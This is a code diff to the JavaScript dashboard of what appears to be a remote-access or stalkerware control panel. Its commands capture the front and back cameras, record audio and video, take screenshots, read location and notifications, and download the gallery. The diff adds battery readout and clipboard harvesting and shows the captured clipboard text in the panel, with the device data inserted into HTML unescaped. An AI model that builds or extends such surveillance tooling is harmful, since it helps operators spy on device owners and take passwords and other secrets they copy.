@@ -141,6 +141,7 @@ function setupDashboardControls() {
         ['btn-notifications', 'get_notifications'], ['btn-camera-front', 'capture_front'],
         ['btn-camera-back', 'capture_back'], ['btn-record-audio', 'record_audio'],
         ['btn-record-video', 'record_video'], ['btn-screenshot', 'screenshot'],
+        ['btn-battery', 'get_battery_info'], ['btn-clipboard', 'get_clipboard'],
         ['btn-download-gallery', 'download_gallery']
     ];
     btns.forEach(([id, cmd]) => {
@@ -412,7 +413,9 @@ function setupDataViewerControls() {
         ['btn-view-apps', 'app_list', renderAppList],
         ['btn-view-location', 'location', renderLocation],
         ['btn-view-storage', 'storage', renderStorage],
-        ['btn-view-device', 'device_info', renderDeviceInfo]
+        ['btn-view-device', 'device_info', renderDeviceInfo],
+        ['btn-view-battery', 'battery_info', renderBattery],
+        ['btn-view-clipboard', 'clipboard', renderClipboard]
     ];
     btns.forEach(([id, type, renderer]) => {
         document.getElementById(id)?.addEventListener('click', () => {
@@ -430,7 +433,9 @@ function setupDataViewerControls() {
                 app_list: 'get_app_list',
                 location: 'get_location',
                 storage: 'get_storage_info',
-                device_info: 'get_device_info'
+                device_info: 'get_device_info',
+                battery_info: 'get_battery_info',
+                clipboard: 'get_clipboard'
             };
 
             // Send command to device first
@@ -530,6 +535,28 @@ function renderDeviceInfo(info) {
     const d = info.device_info || info;
     return `<table><tbody>` +
         Object.entries(d).map(([k,v]) => `<tr><th>${k}</th><td>${v}</td></tr>`).join('') +
+        `</tbody></table>`;
+}
+
+function renderBattery(b) {
+    if (!b || !Object.keys(b).length) return '<p class="data-empty">No battery data</p>';
+    return `<table><tbody>` +
+        `<tr><th>Level</th><td>${b.percent ?? '?'}%</td></tr>` +
+        `<tr><th>Status</th><td>${b.status || '?'}</td></tr>` +
+        `<tr><th>Plugged</th><td>${b.plugged || '?'}</td></tr>` +
+        `<tr><th>Temperature</th><td>${b.temperature ?? '?'}°C</td></tr>` +
+        `<tr><th>Voltage</th><td>${b.voltage ?? '?'}V</td></tr>` +
+        `<tr><th>Health</th><td>${b.health || '?'}</td></tr>` +
+        `</tbody></table>`;
+}
+
+function renderClipboard(c) {
+    if (!c || !Object.keys(c).length) return '<p class="data-empty">No clipboard data</p>';
+    const text = c.text || '(empty)';
+    const note = c.note ? `<tr><th>Note</th><td>${c.note}</td></tr>` : '';
+    return `<table><tbody>` +
+        `<tr><th>Content</th><td>${text}</td></tr>` +
+        note +
         `</tbody></table>`;
 }
 
